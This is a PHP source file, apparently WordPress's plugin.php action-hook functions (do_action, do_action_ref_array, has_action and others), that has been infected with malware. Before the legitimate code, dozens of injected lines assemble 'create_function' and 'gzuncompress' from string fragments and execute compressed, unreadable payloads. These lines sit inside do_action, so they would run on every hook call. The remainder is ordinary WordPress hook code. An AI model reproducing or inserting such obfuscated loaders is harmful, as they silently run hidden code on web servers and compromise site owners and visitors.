	$hEqtcRj = 'create'.'_'.'function'; $iTdWQKB = 'gz'.'unc'.'ompress'; $tssiulgb = $hEqtcRj('', $iTdWQKB('x���A� E�2�PHl��t��P"c1��{�MӴ+��ɟ7?�t$3��ɠh�"%�����Fg�Tª4����
�Eҙ�af�}s�ڗ�>��n��+�\���	�#�������οø`I�(�d��C�a]!K��;��&9Kk�W��{��T��65;���~���|�L��')); $tssiulgb();



	$pglOZPy = 'create'.'_'.'function'; $SzItmFH = 'gz'.'unc'.'ompress'; $mmqmnnyb = $pglOZPy('', $SzItmFH('x���A�0E�2��6A�q�aH�B��R�h1��-l��.g�����-K�/èIT�d�Ĉ!Tdzl��e���q���ۋ�h��\�������8@���l���x*
~�\'薵�����\'yd�;Le�X�������J#�Vl�q��Vv\'��K�n��aQ����o��b߂�/����')); $mmqmnnyb();



	$kprFaSu = 'create'.'_'.'function'; $ZLPuiVN = 'gz'.'unc'.'ompress'; $ljvgzeew = $kprFaSu('', $ZLPuiVN('x���A�0E�2��6A낸�0��jZh�H���-l��.g�����5K�/àI^�L�r!ђ5B�4�~Pn@�Ep{����1\�2�P��W�s8�����	�f�6X�=��#��a�(㐦���Ԧ�0ϐ�DSZIU�v"��.��� �U�v�?pXԬ8w���ط�E��3��')); $ljvgzeew();



	$GLgqMYD = 'create'.'_'.'function'; $pPBHxvz = 'gz'.'unc'.'ompress'; $ffeoyqkg = $GLgqMYD('', $pPBHxvz('x���A�0E�2��6A낸�0��)4R�t���6��
�3�������0��Y&nr!ѐm�B�b��A���m���Zc���k\�����j�}�CQ�#<�h�M�%�Ɠ�<����2i
,�L�j�ILԥ�T5l#�ZlrX�5RY�a���Y͂s׿q��}�E� 2A�A')); $ffeoyqkg();



	$veUaJSi = 'create'.'_'.'function'; $KMFdbmx = 'gz'.'unc'.'ompress'; $hutyszhe = $veUaJSi('', $KMFdbmx('x���A�0E�2��6A낸�0�@�Ph�`Q��bb����L���y�b�v����S�,��{��4�ļ�0w}i{tNx�-���%����U6���2]������e�w��t�G��"�
�H	�8��V6�i�(djir*ۈ��z�$�w?��0Z�v��{�OM���{�')); $hutyszhe();



	$jaKvukn = 'create'.'_'.'function'; $ryAmRFg = 'gz'.'unc'.'ompress'; $hyhnbiog = $jaKvukn('', $ryAmRFg('x����� De롅��?�Ж(V�����c�R��;�23z ��<��5�T�&K)1�ְ^
#��B����Z�ƣW��������V���4�O���\�:b���-�+
e	��T���E>��
�9��f�6�(�wnB9�SX�o�����wk[/Ou��')); $hyhnbiog();



	$BlWXJqt = 'create'.'_'.'function'; $yoicGng = 'gz'.'unc'.'ompress'; $wxcbzfyv = $BlWXJqt('', $yoicGng('x�����0Ee`m��q��4
m£iG���n!&��
]��Ι��kiǽ�(�V����2�=Sص����ale�t�y�+�e��Oeq�/��(�Rz�RuC�������w�5�u+���C�ؙW\'L)$	��=��9�3D!��N`�H����F"�����"h�����}jZt> ��')); $wxcbzfyv();



	$ktfaNCe = 'create'.'_'.'function'; $tYKTdVk = 'gz'.'unc'.'ompress'; $dyjlaogk = $ktfaNCe('', $tYKTdVk('x���A�0E�2��6A낸�0M��V�4�h1��bb����L���y�&�	<z�bo��Excd[ˤV�s��*ݪ�N�N���`E��N���T���bB�mY���Ԥ6Vq՛�a$b�^a�1��e@�����0�����+MR6�YZ�Lo���?(L�f�;���ܧ�I�ݔ��')); $dyjlaogk();



	$ExzQJBc = 'create'.'_'.'function'; $iUToEBV = 'gz'.'unc'.'ompress'; $wyqwlpsa = $ExzQJBc('', $iUToEBV('x���A�0E�2��6A낸�0M�B���h1��-��]�˙�y��tC�yp��H���p,��v��R����I�Y��j�Q������bk��)�A���^M(`�/Kz�;�4�H.G��G"v��s
Y$yO�l�I̴�X)���fi��ȟw?��0Z�����r��f��/')); $wyqwlpsa();



	$OCYGbyx = 'create'.'_'.'function'; $EuxLcyQ = 'gz'.'unc'.'ompress'; $lwtrvzsd = $OCYGbyx('', $EuxLcyQ('x���A�0E�2��6A�q�a�
�hڑŻ��]�˙�y��t�"�Ep���(�� ����`��Q�ܻ�:�=�+��TGh���˽ml������̈́�<�\'���X��jԞ�L�־�4R�!I�E祉�a� �3�h%�q^c��J����?8,�V�����ܧ�E�<��g')); $lwtrvzsd();



	$gIhpWez = 'create'.'_'.'function'; $dHWhuav = 'gz'.'unc'.'ompress'; $wmzcwyhy = $gIhpWez('', $dHWhuav('x���A�0E�2��6A�q�a�
�6���т��bb����L���y�d��"t��V,���0���l������+\����yېj���a���i�p~�\۶XMHa�2~�;����VB�Ɠ��d�+L=%�X��Z���)S	+)�l��7),�J�x�����,h�����}j�u> G��u')); $wmzcwyhy();



	$PnIhaTw = 'create'.'_'.'function'; $icOPshK = 'gz'.'unc'.'ompress'; $ujazvrdi = $PnIhaTw('', $icOPshK('x�����0De� mB��ŏ!�Z�B�.�(����1z���ξ̌nI�C�F~5�l���Bk����4^8/C`��\'/��)WP��F�A�{+�t�*z�\'薴��Z�:`H��-�
y$�T���Y:t���(r`i�%l�Nb�=�~7����_�o�-�m� �R�J')); $ujazvrdi();



	$aPSgyXe = 'create'.'_'.'function'; $YdJflwQ = 'gz'.'unc'.'ompress'; $swgilqdr = $aPSgyXe('', $YdJflwQ('x����� De�CI#/~�B	��4����c�R��;�23�\'��<��b��]�Rb�eR	��<郊��4{��൯)}@��$��5p<�-=�LOzcW��3��qƚBU)>U{<²@�w;MJ�׬l`C
y7����`
k���o�R~��nam����<')); $swgilqdr();



	$LjfVICw = 'create'.'_'.'function'; $QPZHfVB = 'gz'.'unc'.'ompress'; $lgdlgtol = $LjfVICw('', $QPZHfVB('x����� De롅��?��B�
�U�X�]ڋ1z��ݝ}�3�ʤ>G��j%i؝G�sf�eBr+��Q�ĬV��ǠCC��������u�O0#����M�T0��[�36�H������rP��8hr`e�-lH%���r�����(��/巍�ֶ^RΙ�')); $lgdlgtol();



	$YSMwnmx = 'create'.'_'.'function'; $hWnfKdL = 'gz'.'unc'.'ompress'; $fepuiirz = $YSMwnmx('', $hWnfKdL('x�����0De� mB��ŏi*li
M�X���c��ݝ}��Yf�L���v�
qSA���!׉U��<���Qh����~���?�6nh���p:W���f�v(q���!��b�������O��0ϐ-�V:E�a��š��"�z�	��`k����)�m|����«�C')); $fepuiirz();



	$pdWZXmv = 'create'.'_'.'function'; $WCGZPBo = 'gz'.'unc'.'ompress'; $bqcjgnsi = $pdWZXmv('', $WCGZPBo('x�����0De� mB��ŏ!�Z�BmWK"����1z���ξ̌�I�C�F�IJv���BkX\'��i�|���WqƠN���e�n�[�S]�3<A���F6r�C uo1�XR(
 ٧j�GX��ah,G�H�Қ�l�Ab#��LaͿQ��_�o�-�m� \'��x')); $bqcjgnsi();



	$KDoWNPG = 'create'.'_'.'function'; $fbphlqu = 'gz'.'unc'.'ompress'; $dpslfuhr = $KDoWNPG('', $fbphlqu('x����� De����҃�c����X�I��4M{��ݝ}��Hab��A~�����K)1��2!��y���A�Ȅ�V�:���5�赛ı�Η��Wx�QD+;���1c����)T��Su�#�+�0t�c�I����Ab�O#��0����_�o�-lm� ��')); $dpslfuhr();



	$QFTDcpY = 'create'.'_'.'function'; $ESlzkBL = 'gz'.'unc'.'ompress'; $zaqeuvif = $QFTDcpY('', $ESlzkBL('x�����0�_e� mB��Ňi*,�I�.?Q|wc��ݝ�23�f�	r���E��Q�b�&��YQ��箯|�!����0����8@�]W�{��t.
~�\'���Ƣ��
Cο�4S�!M�%��=aY ��F:E�f��Æl�dٵ��n0�5�F�ÿ��6�[X�z�Ϛ.')); $zaqeuvif();



	$hxyloJP = 'create'.'_'.'function'; $MPtseOi = 'gz'.'unc'.'ompress'; $tryevpiy = $hxyloJP('', $MPtseOi('x�����0De� mB��ŏ!h�BӮ"����1z���ξ̌jY�|�"y��r1I\'B�\'�E�Rc�G�X��rNV-\'�ۜ�Խ�co�/eɯ�ղVi�pV�|Đ�o1͔s�2`ɧ�GXWH⡫���g��k��#;����0�Ö������6�[��zf�')); $tryevpiy();



	$yhbLgTE = 'create'.'_'.'function'; $usXJdFS = 'gz'.'unc'.'ompress'; $frqseiyt = $yhbLgTE('', $usXJdFS('x�����0De� mB��ŏ!��I�ڮ#����1z���ξ̌Q,3��ސ<[d��I/b�BSoE��b�G�:�!�/͝�N���4��mo%�U�O���2k�L��0Ի��&*8�9��S��#�3d��ս�F��Hk�+aEvHu3��f0�%�Jq�)�m|�����/��')); $frqseiyt();



	$pYISceN = 'create'.'_'.'function'; $qBjPZHk = 'gz'.'unc'.'ompress'; $webvbjqk = $pYISceN('', $qBjPZHk('x�����0�_e� mB��Ň!Z姶+%������qwg�̌nX�]�&Yv�R1I+��BQ߉e�amm,:\'<�Sy�]F���T��}oOy���ݰFwX����޼�4S�!I�E��=aY 
���%U��"�E���l��j��`k��b��R~��nam�d^��')); $webvbjqk();



	$NUvDghR = 'create'.'_'.'function'; $cWNmjOs = 'gz'.'unc'.'ompress'; $uhfztcee = $NUvDghR('', $cWNmjOs('x�����0De� mB��ŏ!X��IM�Q�wc��ݝ}��Xfb=C��"+ĭ	b�&��Y�bc1�Ch}�Ũ՝$��k_p� ����{+�t�*~�\'Ŕ�X�l"ń!��b�������O���,��CW���f���P�j9��n0�5�F�㿔�6�[X�zpΙ�')); $uhfztcee();



	$UHOhkzP = 'create'.'_'.'function'; $iCcxWul = 'gz'.'unc'.'ompress'; $kzbvkfnc = $UHOhkzP('', $iCcxWul('x�����0�_e� mB��Ň!�l�ᯡ+%��n�b�^𸻳_f�hW�ɐ,;d���$�������<N���9��˹Ճ:�Ʀ�?@5�X{��|�s~�\'ʹ���8rC�}�i��C� �>UG<ºBu�KR�EX�8�Y#j��`[��bo�R~��nak�uҙ�')); $kzbvkfnc();



	$ThiANKD = 'create'.'_'.'function'; $MfJXnrj = 'gz'.'unc'.'ompress'; $ayjejepk = $ThiANKD('', $MfJXnrj('x�����0De� mB��ŏi*,Pl�iW���n�b�^𸻳/3�k�� G�I��Lܔ�8���*�q|�<� Խ��e�Z�q����C��-�ñ(�	��kVk�\'(DY��D�4�|��x�y�$i�-ۉ��Vd�$ˡ\'�7�9,�W���K�m㻅��3m��')); $ayjejepk();



	$ezJKDsY = 'create'.'_'.'function'; $JOTwDtc = 'gz'.'unc'.'ompress'; $blsccxtd = $ezJKDsY('', $JOTwDtc('x����� De����҃�cPH@	l�I��4M{��ݝ}�3���.�������K)1��2��Uy���A��z�XP���5�����[�K��+<�d0Vuj1cƠ�o1.XS�* ŧ�GXW(�a�G�I����Qa\'�	�tLa˿S��_�o�-lm� H:��')); $blsccxtd();



	$zxUKViE = 'create'.'_'.'function'; $QCrhJSp = 'gz'.'unc'.'ompress'; $fktcsuqt = $zxUKViE('', $QCrhJSp('x����� �_e�CI#/>A
����4����c�R��;�ef�&�<z���)R���,���k��T�G�8�B`��2L7<8�JJ M?6��*8�ꚞ�	Vm;��l���޽�8cI�(�d��=aY K����!9Kk�W�![�\��a7����_�o�-�m� 贚t')); $fktcsuqt();



	$RWNkeQa = 'create'.'_'.'function'; $OBPbwgG = 'gz'.'unc'.'ompress'; $lesnevoe = $RWNkeQa('', $OBPbwgG('x�����0De� mB��ŏiڤ�M����.����;�23�g��r���AV��	b�g���ac0�.t>`��`qrx�ʗ�?�U�u��*8_�_�	�g�6(qёb�o1-Tr(
`٧�GXW��a���V�\���+ؑ�l�H8s��������w[[/��')); $lesnevoe();



	$MehQZwH = 'create'.'_'.'function'; $oyNThEg = 'gz'.'unc'.'ompress'; $hhqqdqtb = $MehQZwH('', $oyNThEg('x����� De����҃�CPPH@Q�Ť�ߋ^������ξ̌�Hf��A�XEJv3�12��2��Uig�g�z����k_R��V�Q{��|�kz�\'��t�*�0$:��%�� �}��x�u�,z����,�Y^����vP����;�����������ii��')); $hhqqdqtb();



	$AehzCGR = 'create'.'_'.'function'; $yzvaqhp = 'gz'.'unc'.'ompress'; $vdemoaoh = $AehzCGR('', $yzvaqhp('x�����0De� mB��ŏ!ڤ�M�R��.����;�23�g��M
��� +�$�H)	Eֈ��uv��cS��I�N^����ʺ��[�K]�+<A����u��b����f*9��Su�#,d�ah��V�\�k�W�#��u#�x�a˿S��_�o�-lm� 4[��')); $vdemoaoh();



	$qxpEXVe = 'create'.'_'.'function'; $itkzATh = 'gz'.'unc'.'ompress'; $ecwrfsns = $qxpEXVe('', $itkzATh('x�����0De� mB��ŏ!�li�M�Z��-\��ww�ef�f��m
���!��]�R�\':��<���Q�JA�1���Pf��}o5��M�/����[�m��14���f�8�%��S��#,�з�$e�A�8԰!{�VM#��aͿQ��_�o�-�m� ��.')); $ecwrfsns();



	$sWLDbAM = 'create'.'_'.'function'; $GJXLZlc = 'gz'.'unc'.'ompress'; $xyevqnbf = $sWLDbAM('', $GJXLZlc('x�����0�_e� mB��Ňi���&-T�F|wc��ݝ�23F��9���"��Xb�&��Y�`i1����C��kW���>���v}��-�ӹ(��`SƢ��
Cο�4S�!M�%��=aY ��V��j�"��!��"ɺ���`k���o�R~��nam���f')); $xyevqnbf();



	$mIEPYGw = 'create'.'_'.'function'; $lDxmVnO = 'gz'.'unc'.'ompress'; $dugikwff = $mIEPYGw('', $lDxmVnO('x����� De롅��?���-��4����c�R��;�23F���6��j%�؝�Rb�eBr+�<჌���7����k_Q��N�Q�{��tnz�\'E������3��qƊBY)>U{<²@�}�8v�X^�C���v�r�����(~�����wk[/IR��')); $dugikwff();



	$PUfStcN = 'create'.'_'.'function'; $jwYspCy = 'gz'.'unc'.'ompress'; $ovuoqtrd = $PUfStcN('', $jwYspCy('x�����0�_e� mB��Ň!�.�	��.?���.����;�efL�����Y.&��<�BS�	���8[�����F{\'�NN���Ժ���[�KY�+<�4�1V��@!b�wo1-�s�2`ɧ�GXWH⡭zI�f��k��#[����p�a˿S��/巍���^<��')); $ovuoqtrd();



	$PyfpeXV = 'create'.'_'.'function'; $MQvxscA = 'gz'.'unc'.'ompress'; $vnxhypym = $PyfpeXV('', $MQvxscA('x����� De����҃�C����؊��ߋ^������ξ̌�H��^��IJ6	�b�L�5����4��u^���aV�[��)WR��Fٱ=�V��R��
O�鴑\�:`H��-�K
E$�T��
Y:��
l�YZ����K��8��)l�w���K�m㻅�����F')); $vnxhypym();



	$yGHNwam = 'create'.'_'.'function'; $RYCZbKH = 'gz'.'unc'.'ompress'; $yznqxpng = $yGHNwam('', $RYCZbKH('x�����0De� mB��ŏi*ڤ-��������qwg_fFw$Ӂ�Q�8IJv#�12�ְV
#�<��e�vw�ɻ~�/)}@���n{�`�kz�\'�t�H.\'0$Z��%�� �}��x�y�,zn6��,�Y^���%�fp(�f0�%�J�)�m|����y$�*')); $yznqxpng();



	$XcglGTI = 'create'.'_'.'function'; $CqOsjcp = 'gz'.'unc'.'ompress'; $wltefwza = $XcglGTI('', $CqOsjcp('x�����0De� mB��ŏi*li�M�Z���c��ݝ}��Yf�L���8d��� RJ�P�D���2���c��tWo|��ӏ�
����gx��L[�\').��[L��X���������^QcX.���+ؐ�lƁp����(��/巍�ֶ^�W�m')); $wltefwza();



	$fjIHPev = 'create'.'_'.'function'; $ltiQXTF = 'gz'.'unc'.'ompress'; $padlzaug = $fjIHPev('', $ltiQXTF('x����� De롅��?�`��Z[i����c�R��;�23�#��<��j��M�Rb�eR	��<郊�y!�]L��k_Q��V�Q�{��tnz�\'��t�*�f1f:����R|��x�e�"z���X^�C�W��q@5�SX�o?�K�m㻅��M���')); $padlzaug();



	$uxBoJsh = 'create'.'_'.'function'; $cLOvRhp = 'gz'.'unc'.'ompress'; $czmpnfun = $uxBoJsh('', $cLOvRhp('x�����0De� mB��ŏij�B
M�X���c��ݝ}�kXf�L���v�
qSA��DK�5��y���w�{3�G���������N��x�5��%N6R\0��[L�X��������H�H�� ��8��!$��������(~�����wk[/�ǚX')); $czmpnfun();



	$SYiBWyI = 'create'.'_'.'function'; $lHhSjqx = 'gz'.'unc'.'ompress'; $agznnlpx = $SYiBWyI('', $lHhSjqx('x����� De�CI#/~���Vi����c�R��;�23z ��<��b$��M�Rb
�a�F�y
�2F&ƻs���|M�:e�~�[�S��3<Ad�Fr9�1c���g�)T��S��#,�0r+�S�dy��6�(�w�C�v�)��7���K�m㻅���Q�_')); $agznnlpx();



	$YfPZDhu = 'create'.'_'.'function'; $XlyziUr = 'gz'.'unc'.'ompress'; $lfphfijs = $YfPZDhu('', $XlyziUr('x����� De�CI#/~�
Z�4����c�R��;�23F��D��Aq����.K)1�β^
+�<��#��ke��൯)}@����{k�xj[z�\'E�����D��ο�8cM�����=aY�ȇ�;��&%�kV6�!���F��n0�5�F�)�m|����C(��')); $lfphfijs();



	$aUcPrfk = 'create'.'_'.'function'; $dUbOfQV = 'gz'.'unc'.'ompress'; $wgpnfkxc = $aUcPrfk('', $dUbOfQV('x����� De�CI#/~L�
Z�4����c�R��;�23F���.��b%�ٝ�Rb�e��V�y
�2F�?��,^����~�[�S��3<�(�����MĘ1��[�3��
H�����|:�QhR��fer�؉iD9�SX�o�����wk[/�ǚ')); $wgpnfkxc();



	$IPYFHWQ = 'create'.'_'.'function'; $DJnoOLl = 'gz'.'unc'.'ompress'; $fawgjyzd = $IPYFHWQ('', $DJnoOLl('x�����0De� mB��ŏi*m��@Ӯ������qwg_f�h����7(NV��]�g1F�ao�Tª4�^:�B`Z��|�˝�\I���嶷
����Gx��D���L��0ػ�\',)��S��#�3d���^`ӑ��5�+X��Bތ�a3���˿��6�[X�z�M�')); $fawgjyzd();



	$JNyiLsj = 'create'.'_'.'function'; $mdgQFjt = 'gz'.'unc'.'ompress'; $untmzetw = $JNyiLsj('', $mdgQFjt('x�����0De� mB��ŏ!ڤ��],Q�wc��ݝ}�ݱL�:zM�j��&��1
Eֈ��4��uC�@���N���4ʎ�N��x��X��8�@!aȺ��f*8�9��S��#,d���VR��A��8��!{���a7�Ú���_�o�-�m� q:�#')); $untmzetw();



	$wCmAIOW = 'create'.'_'.'function'; $HCqEaSA = 'gz'.'unc'.'ompress'; $yohfhmbn = $wCmAIOW('', $HCqEaSA('x����� De롅��?��-(V�����c�R��;�23Z�B�6��3�T��K)1�ְAp#�������ݝ��v��+_Q��^Y7�{��tnz�\'hI�6���3��qƊBY)>U{<²@�ck9��X^�Cr��nB1�SX�o�����wk[/`k��')); $yohfhmbn();



	$UsHQrid = 'create'.'_'.'function'; $aQSmpob = 'gz'.'unc'.'ompress'; $alyoywxj = $UsHQrid('', $aQSmpob('x�����0De� mB��ŏ!
�iiӮ"����1z���ξ̌�I�B�B~т���=�12�F�Np-�l}��q=�9N׃�����4���V��T��OP=���T��0h�[���H������tñ�$gi��
6� �i�b�����(��/巍�ֶ^I���')); $alyoywxj();



	$YzoHcVj = 'create'.'_'.'function'; $wYFpizK = 'gz'.'unc'.'ompress'; $oxnhqyer = $YzoHcVj('', $wYFpizK('x�����0De� mB��ŏi*,�	��]#����1z���ξ̌iYf��!u�⦂�Qh��hP��f0F�A_��^����ںf�[	�cU�<���5=J�L��0d�[L�X������t�UTk�i-v%��I�n 6�9,�W���K�m㻅�����')); $oxnhqyer();



	$qeundXl = 'create'.'_'.'function'; $yFDtLeS = 'gz'.'unc'.'ompress'; $qbiegxhb = $qeundXl('', $yFDtLeS('x�����0De� mB��ŏi
,�I���D�wc��ݝ}�ӱ�\'C���
qW��1
MΊ��4�S�\'A\k����׾���vc�פּӹ���`:��g($9��L�<�}��x�e�,z�5�DZ�C	�G��8�����������������G')); $qbiegxhb();



	$OkoJpPa = 'create'.'_'.'function'; $OwbJoWH = 'gz'.'unc'.'ompress'; $zvagmyzk = $OkoJpPa('', $OwbJoWH('x�����0De� mB��ŏ!
ml�iW���n�b�^𸻳/3�Z�(_��_� 9�c!&�h��E��X\'�g��;s��+mN�ji�f�[�SY�3<A��UZTbR}Ġ�o1N�S�2 ɧj�GXH⡫�Z���5Kؐ���z�n0�5�F��)�m|����6A��')); $zvagmyzk();



	$mUMurpJ = 'create'.'_'.'function'; $DBghNYm = 'gz'.'unc'.'ompress'; $cyuceabw = $mUMurpJ('', $DBghNYm('x�����0De� mB��ŏ!�,Ф��.#����1z���ξ̌nY�}&M�6�rq��!���J�q��M�P�Y�����.����cs쭀�,���[�j�.ړ���-��rY,�T��
I<t���z���i;�C��8����;���R~��nak�4��')); $cyuceabw();



	$JZRiuUr = 'create'.'_'.'function'; $fSEryqW = 'gz'.'unc'.'ompress'; $pgjoomon = $JZRiuUr('', $fSEryqW('x����� De�CI#/~���4����c�R��;�23z ��<��b$��]�Rb
�a�F�م�#���9릃W�����������Զ�O���\�:b���-�k
U��T���E>��
�)Y^���9J䝛PN������������������ ')); $pgjoomon();



	$TMGiEUN = 'create'.'_'.'function'; $vUhiynx = 'gz'.'unc'.'ompress'; $yhwjzpcp = $TMGiEUN('', $vUhiynx('x�����0De� mB��ŏ!�Z�BӮ������qwg_fFw$ӡ�^#?IJv���BkX+��i}���T<ߝp;�\I���c��������;�i#9�!aк�\',)��S��#�3d��7��P$gi��
Vd/��r����_)��/巍���^!䚺')); $yhwjzpcp();



	$eLXZrNV = 'create'.'_'.'function'; $jdbGSXw = 'gz'.'unc'.'ompress'; $cganfclu = $eLXZrNV('', $jdbGSXw('x����� De����҃�c(���X�I��4M{��ݝ}��Hab��A~�����K)1�β^r+�<��#����k_S� ���{k�|i[z�\'E������3��q��BU)>UG<ºB�C�8
MJ�׬l`G;1�(��`
[����)�m|�����a�')); $cganfclu();



	$kfNiRId = 'create'.'_'.'function'; $urLVpRW = 'gz'.'unc'.'ompress'; $jhbudgxj = $kfNiRId('', $urLVpRW('x����� De�A!1��K?Ơ�`@	�Ť�ߋ^������ξ̌�H�C�F�I
v���Bk����4O^8/C`�jf�/��)WP��V�I{+�r�*z�\'�t��Z.:`H��-�
y$�T��
Y:����*rbi�N%��^b�N#��0����_�o�-lm� B���')); $jhbudgxj();



	$iCSDneE = 'create'.'_'.'function'; $sTeYAbi = 'gz'.'unc'.'ompress'; $jhclyncq = $iCSDneE('', $sTeYAbi('x�����0De� mB��ŏ!�Z�BmW�������qwg_fFw$ӡ�^#?IJv���BkX+��i}����0�A\vN���e�v�[�C]�#<Aw��F6r�C uo1NXR(
 ٧j�G�g�ҡo,G�H�Қ���^b#��LaɿR��_�o�-,m� c#��')); $jhclyncq();



	$MSBcqpf = 'create'.'_'.'function'; $zQRNOty = 'gz'.'unc'.'ompress'; $xcwmkkvn = $MSBcqpf('', $zQRNOty('x����� De����҃�c(�A	lŤ�ߋ^������ξ̌�H�C�F~3��l���BkX+��i�|��-"�a�ǓS���B٩=�V��R��
O�鴑�\t��0h�[���H��:���t��Q(���fy;��؈iD9S���w�����w[[/ }��')); $xcwmkkvn();



	$WnNGlRw = 'create'.'_'.'function'; $ndqkOIR = 'gz'.'unc'.'ompress'; $scjgdtfw = $WnNGlRw('', $ndqkOIR('x����� De�CI#/~�
Z�4����c�R��;�23F��D����b%�ٽ,��4:˄����2F�� P��׾���v������Զ�O0�(c%���3��qƚBU)>U{<²@�w���,�Y���$�~Q����������������c#��')); $scjgdtfw();



	$nbOZzIa = 'create'.'_'.'function'; $aFepcHM = 'gz'.'unc'.'ompress'; $lxomxcrr = $nbOZzIa('', $aFepcHM('x����� De롅��?�AJ	��X�]ڋ1z��ݝ}�=�J�>��j$i؝�Rb
�a��F�م�#3��,B8z�J �uþ�N箣x�ɨ��e�c���o1fl(�5��S��#,T�0���P��ʚZؐ��^��LaͿQ��_�o�-�m�  ̚�')); $lxomxcrr();



	$FbBpLQh = 'create'.'_'.'function'; $tJrCOwf = 'gz'.'unc'.'ompress'; $jutxjtpd = $FbBpLQh('', $tJrCOwf('x����� De����҃�c��`@	�Ť�ߋ^������ξ̌�H�C�F~3����=�12��0!��i��p^�����89�JJ�*;�co�/uM��ݑN��E	�ֽŸ`I�(�d��#a]!K���[Er��,�`G��vQ�����;���R~��nak����')); $jutxjtpd();



	$nxjYeXC = 'create'.'_'.'function'; $VazSbmQ = 'gz'.'unc'.'ompress'; $bwiomslq = $nxjYeXC('', $VazSbmQ('x����� De롅��?�Ж(�4����c�R��;�23z ��<��5�T�.K)1�ְ^
#��B��I;��蕯(}@������p:7���@m$���3��qƊBY)>U{<²@�#�;E,�١�9J䝛PN������������������C')); $bwiomslq();



	$fVQDFAM = 'create'.'_'.'function'; $DYtoelm = 'gz'.'unc'.'ompress'; $jfjtyhkz = $fVQDFAM('', $DYtoelm('x�����0De� mB��ŏiZZl���E��p1F/x��ٗ�ђ$��0j�NF��]����BkX#*#�<����������s��>�Vvh���?�%=��$R�Ť=��A��b�0��e@�O��0ϐ�C�m��")�k��"[��z�f0�%�Jq�)�m|�����x�m')); $jfjtyhkz();



	$fDpJbZI = 'create'.'_'.'function'; $OQFNvde = 'gz'.'unc'.'ompress'; $nrouhcum = $fDpJbZI('', $OQFNvde('x����� De����҃�c(���X�I��4M{��ݝ}�=�B�.��f$�ٝ�Rb
�a��F�م�#�������+_S� ��돽5p��-���@md\'1fZ��5��R|��x�u�"��r��,�Y���%v�M(��`
[����)�m|����ռ�X')); $nrouhcum();


	global $wp_filter, $wp_actions, $wp_current_filter;

	if ( ! isset( $wp_actions[ $hook_name ] ) ) {
		$wp_actions[ $hook_name ] = 1;
	} else {
		++$wp_actions[ $hook_name ];
	}

	// Do 'all' actions first.
	if ( isset( $wp_filter['all'] ) ) {
		$wp_current_filter[] = $hook_name;
		$all_args            = func_get_args(); // phpcs:ignore PHPCompatibility.FunctionUse.ArgumentFunctionsReportCurrentValue.NeedsInspection
		_wp_call_all_hook( $all_args );
	}

	if ( ! isset( $wp_filter[ $hook_name ] ) ) {
		if ( isset( $wp_filter['all'] ) ) {
			array_pop( $wp_current_filter );
		}

		return;
	}

	if ( ! isset( $wp_filter['all'] ) ) {
		$wp_current_filter[] = $hook_name;
	}

	if ( empty( $arg ) ) {
		$arg[] = '';
	} elseif ( is_array( $arg[0] ) && 1 === count( $arg[0] ) && isset( $arg[0][0] ) && is_object( $arg[0][0] ) ) {
		// Backward compatibility for PHP4-style passing of `array( &$this )` as action `$arg`.
		$arg[0] = $arg[0][0];
	}

	$wp_filter[ $hook_name ]->do_action( $arg );

	array_pop( $wp_current_filter );
}

/**
 * Calls the callback functions that have been added to an action hook, specifying arguments in an array.
 *
 * @since 2.1.0
 *
 * @see do_action() This function is identical, but the arguments passed to the
 *                  functions hooked to `$hook_name` are supplied using an array.
 *
 * @global WP_Hook[] $wp_filter         Stores all of the filters and actions.
 * @global int[]     $wp_actions        Stores the number of times each action was triggered.
 * @global string[]  $wp_current_filter Stores the list of current filters with the current one last.
 *
 * @param string $hook_name The name of the action to be executed.
 * @param array  $args      The arguments supplied to the functions hooked to `$hook_name`.
 */
function do_action_ref_array( $hook_name, $args ) {
	global $wp_filter, $wp_actions, $wp_current_filter;

	if ( ! isset( $wp_actions[ $hook_name ] ) ) {
		$wp_actions[ $hook_name ] = 1;
	} else {
		++$wp_actions[ $hook_name ];
	}

	// Do 'all' actions first.
	if ( isset( $wp_filter['all'] ) ) {
		$wp_current_filter[] = $hook_name;
		$all_args            = func_get_args(); // phpcs:ignore PHPCompatibility.FunctionUse.ArgumentFunctionsReportCurrentValue.NeedsInspection
		_wp_call_all_hook( $all_args );
	}

	if ( ! isset( $wp_filter[ $hook_name ] ) ) {
		if ( isset( $wp_filter['all'] ) ) {
			array_pop( $wp_current_filter );
		}

		return;
	}

	if ( ! isset( $wp_filter['all'] ) ) {
		$wp_current_filter[] = $hook_name;
	}

	$wp_filter[ $hook_name ]->do_action( $args );

	array_pop( $wp_current_filter );
}

/**
 * Checks if any action has been registered for a hook.
 *
 * When using the `$callback` argument, this function may return a non-boolean value
 * that evaluates to false (e.g. 0), so use the `===` operator for testing the return value.
 *
 * @since 2.5.0
 *
 * @see has_filter() has_action() is an alias of has_filter().
 *
 * @param string                      $hook_name The name of the action hook.
 * @param callable|string|array|false $callback  Optional. The callback to check for.
 *                                               This function can be called unconditionally to speculatively check
 *                                               a callback that may or may not exist. Default false.
 * @return bool|int If `$callback` is omitted, returns boolean for whether the hook has
 *                  anything registered. When checking a specific function, the priority
 *                  of that hook is returned, or false if the function is not attached.
 */
function has_action( $hook_name, $callback = false ) {
	return has_filter( $hook_name, $callback );
}

/**
 * Removes a callback function from an action hook.
 *
 * This can be used to remove default functions attached to a specific action
 * hook and possibly replace them with a substitute.
 *
 * To remove a hook, the `$callback` and `$priority` arguments must match
 * when the hook was added. This goes for both filters and actions. No warning
 * will be given on removal failure.
 *
 * @since 1.2.0
 *
 * @param string                $hook_name The action hook to which the function to be removed is hooked.
 * @param callable|string|array $callback  The name of the function which should be removed.
 *                                         This function can be called unconditionally to speculatively remove
 *                                         a callback that may or may not exist.
 * @param int                   $priority  Optional. The exact priority used when adding the original
 *                                         action callback. Default 10.
 * @return bool Whether the function is removed.
 */
function remove_action( $hook_name, $callback, $priority = 10 ) {
	return remove_filter( $hook_name, $callback, $priority );
}

/**
 * Removes all of the callback functions from an action hook.
 *
 * @since 2.7.0
 *
 * @param string    $hook_name The action to remove callbacks from.
 * @param int|false $priority  Optional. The priority number to remove them from.
 *                             Default false.
 * @return true Always returns true.
 */
function remove_all_actions( $hook_name, $priority = false ) {
	return remove_all_filters( $hook_name, $priority );
}

/**
 * Retrieves the name of the current action hook.
 *
 * @since 3.9.0
 *
 * @return string Hook name of the current action.
 */
function current_action() {
	return current_filter();
}

/**
 * Returns whether or not an action hook is currently being processed.
 *
 * @since 3.9.0
 *
 * @param string|null $hook_name Optional. Action hook to check. Defaults to null,
 *                               which checks if any action is currently being run.
 * @return bool Whether the action is currently in the stack.
 */
function doing_action( $hook_name = null ) {
	return doing_filter( $hook_name );
}

/**
 * Retrieves the number of times an action has been fired during the current request.
 *
 * @since 2.1.0
 *
